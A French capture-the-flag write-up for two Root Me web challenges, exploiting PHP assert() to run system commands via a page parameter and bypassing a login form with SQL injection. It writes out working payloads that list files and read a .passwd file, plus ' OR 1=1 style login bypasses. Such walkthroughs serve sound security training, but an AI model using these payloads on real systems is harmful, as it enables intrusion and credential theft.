# DETECTION DE VULNÉRABILITÉS
##### Write UP - Root Me
##### tous les flags trouvés dans ces challenges seront tronqués
</br>
</br>

### Chall 1 : [PHP - assert()](https://www.root-me.org/fr/Challenges/Web-Serveur/PHP-assert)
----
</br>

![alt text](imgchall1/php-assert.png "PHP - assert()")
</br>

En se déplaçant sur le site on peut remarquer que les pages sont introduites par
> ?page=

donc on teste des valeurs ramdom pour voir ce que cela nous retourne
> ?page='test'

ce qui va sans surprise nous retrouner une erreur:
> Parse error: syntax error, unexpected T_STRING in /challenge/web-serveur/ch47/index.php(8) : assert code on line 1 Catchable fatal error: assert(): Failure evaluating code: strpos('includes/'test'.php', '..') === false in /challenge/web-serveur/ch47/index.php on line 8

A partir de là on sait qu'on peut faire exé-cuter du code grâce à __?page=''__ donc le but dans un premier temps va être d'essayer de faire ressortir la liste des fichiers du répertoire. Pour ce faire on peut essayer d'utiliser la commande __system()__
> ?page='.system("ls -la").'

ce qui nous retourne la liste de tous les fichiers du répertoire courant
```
total 32 
dr-xr-x--- 3 web-serveur-ch47 www-data 4096 Feb 27 2018 . 
drwxr-s--x 69 challenge www-data 4096 Feb 2 15:30 .. 
-r-------- 1 challenge challenge 90 Nov 20 2016 ._nginx.http-level.inc 
-r-------- 1 challenge challenge 727 Nov 20 2016 ._nginx.server-level.inc 
-r-------- 1 challenge challenge 218 Feb 27 2018 ._php53-fpm.pool.inc 
-r-------- 1 web-serveur-ch47 www-data 192 May 7 2017 .passwd 
drwxr-sr-x 2 web-serveur-ch47 www-data 4096 Feb 7 2018 includes 
-rw-r----- 1 web-serveur-ch47 www-data 811 Feb 19 2018 index.php 'includes/'.system("ls -la").'.php'File does not exist
```

On peut voir alors que le fichier qui nous interresse se trouve dans ce répertoire
> -r-------- 1 web-serveur-ch47 www-data 192 May 7 2017 .passwd 

On peut ainsi refaire la même manipulation en changeant un peu le contenu de __system()__
> ?page='.system("cat .passwd").'

ce qui nous permet d'avoir le retour suivant:
> The flag is / Le flag est : x4Ss[...]A1Lx Remember to sanitize all user input! / Pensez à valider toutes les entrées utilisateurs ! Don't use assert! / N'utilisez pas assert ! 'includes/'.system("cat .passwd").'.php'File does not exist

On a donc bien notre flag : __x4Ss[...]A1Lx__
</br>
</br>

### Chall 2 : [SQL injection - Authentification](https://www.root-me.org/fr/Challenges/Web-Serveur/SQL-injection-authentification)
----
</br>

![alt text](imgchall2/sql-injection_auth.png "SQL injection - Authentification")
</br>

Le but de ce challenge comme son nom l'indique est d'exploiter une faille __SQL__ pour pouvoir s'autentifier en tant qu'admin sur le site.

Dans un premier temps nous nous retrouvons sur cette page
</br>

![alt text](imgchall2/sql-injection_auth_2.png "SQL injection - Authentification")
</br>

donc le but va être d'exécuter une requête __SQL__ dans un des champs afin de récupérer les logs admin.

Nous allons d'abord essayer de récupérer les logs de l'utilisateur n°1 en base de données. Pour cela on entre la requête suivante dans le champ __Login__ et on met un caractère (minimum) dans le champ __Password__ afin de ne pas le laisser vide.
> ' OR 1=1 /*

ce qui nous permet de nous logger sur l'utilisateur 1
</br>

![alt text](imgchall2/sql-injection_auth_3.png "SQL injection - Authentification")
</br>

A partir de ce moment nous pouvons supposer que l'administrateur a une entrée nommée __admin__ en base de données. Nous exécutons la requête suivante afin d'obtenir les logs d'un potentiel utilisateur __ADMIN__
> ' OR 1=1 AND `username`='admin' /*

Cette requête s'avère être la bonne car nous avons pour retour à ce moment
</br>

![alt text](imgchall2/sql-injection_auth_4.png "SQL injection - Authentification")
</br>

Le mot de passe __admin__ est non lisible, il ne nous reste qu'à inspecter l'élément et changer le __type=__ du champ password ce qui nous revèle le mot de passe de l'admin.

Le flag est donc : __t0[...]k!$__